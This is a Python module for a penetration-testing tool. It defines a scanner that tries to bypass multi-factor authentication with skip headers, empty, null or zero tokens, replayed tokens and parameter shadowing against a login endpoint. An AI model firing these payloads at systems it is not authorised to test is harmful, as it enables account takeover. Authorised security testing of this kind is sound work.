"""MFA bypass scanner.

Probes common MFA evasion paths:

  * skipping the second factor entirely (``/login`` with no
    ``/mfa-verify`` follow-up)
  * replaying an old / incomplete verification token
  * header manipulation (``X-Skip-Mfa: 1``, ``X-Verified: 1``)
  * JSON ``mfa_token`` empty / null / 0
  * parameter shadowing (``mfa=true`` over POST and GET at once)

Used in lab engagements against in-scope assets the operator has
explicitly authorised.
"""

from __future__ import annotations

import logging
from typing import Any, Dict, List, Tuple

from bugwolf.scanners import Finding, Scanner, make_finding


logger = logging.getLogger(__name__)


class MFABypassScanner(Scanner):
    name = "mfa-bypass"
    bug_class = "mfa-bypass"
    default_severity = "critical"
    PAYLOADS: Tuple[str, ...] = (
        "skip-header",
        "empty-token",
        "null-token",
        "replay-token",
        "param-shadow",
        "zero-token",
    )

    def scan(self, target: str, transport) -> List[Finding]:
        if transport is None:
            logger.warning("mfa-bypass: transport is None; returning []")
            return []
        findings: List[Finding] = []
        for technique in self.PAYLOADS:
            try:
                if technique == "skip-header":
                    resp: Dict[str, Any] = transport(
                        "POST", target,
                        headers={"X-Skip-Mfa": "1"},
                        body="username=victim&password=victim",
                    )
                elif technique == "empty-token":
                    resp = transport(
                        "POST", target,
                        headers={"Content-Type": "application/json"},
                        body='{"username":"victim","mfa_token":""}',
                    )
                elif technique == "null-token":
                    resp = transport(
                        "POST", target,
                        headers={"Content-Type": "application/json"},
                        body='{"username":"victim","mfa_token":null}',
                    )
                elif technique == "replay-token":
                    resp = transport(
                        "POST", target,
                        headers={"Content-Type": "application/json"},
                        body='{"username":"victim","mfa_token":"AAAAAAAA"}',
                    )
                elif technique == "param-shadow":
                    resp = transport(
                        "POST", target + "?mfa_token=AAAAAAAA",
                        headers={"Content-Type": "application/json"},
                        body='{"username":"victim","mfa_token":""}',
                    )
                else:
                    resp = transport(
                        "POST", target,
                        headers={"Content-Type": "application/json"},
                        body='{"username":"victim","mfa_token":0}',
                    )
            except Exception as exc:
                logger.debug("mfa: transport error: %s", exc)
                continue
            rbody = (resp.get("body", "") or "").lower()
            if resp.get("status") in (200, 302) and (
                "success" in rbody or "verified" in rbody
                or "dashboard" in rbody or "ok" in rbody
            ):
                findings.append(make_finding(
                    self,
                    target=target,
                    evidence=f"MFA bypass via {technique!r}",
                    severity="critical",
                    detail={
                        "technique": technique,
                        "status": resp.get("status"),
                        "snippet": rbody[:160],
                    },
                ))
        return findings


__all__ = ["MFABypassScanner"]